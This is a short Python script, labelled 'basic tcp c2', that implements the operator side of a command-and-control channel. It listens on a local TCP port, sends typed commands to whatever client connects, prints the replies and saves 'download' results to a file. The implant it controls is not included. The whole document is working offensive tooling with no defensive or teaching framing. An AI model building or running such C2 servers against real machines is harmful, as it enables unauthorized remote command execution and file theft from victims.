#!/usr/bin/python3
# basic tcp c2

# created by : bluecosmo

# imports
import socket

# constants
HOST = "127.0.0.1"  
PORT = 2583  

# main code
def main():

    # setup socket
    print("[*] Building socket...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))

        # listent for connections
        print("[*] Listining for connections...")
        s.listen()
        connection, address = s.accept()

        # connection established
        with connection:
            print(f"[+] Connected to : {address}")

            # command and control
            while True:
                msg = input("[~] Command : ").encode()
                connection.sendall(msg)

                # parse and display response data
                data = b""
                while True:
                    chunk = connection.recv(1024)
                    if not chunk:
                        break
                    data += chunk
                    if b"\0" in chunk:
                        break

                if (msg == b"download"):
                    with open('word.txt', 'wb') as f:
                        f.write(data)
                    print("[+] File downloaded successfully.")

                else:
                    print(data.decode())

# run main code
if __name__ == '__main__':
    main()
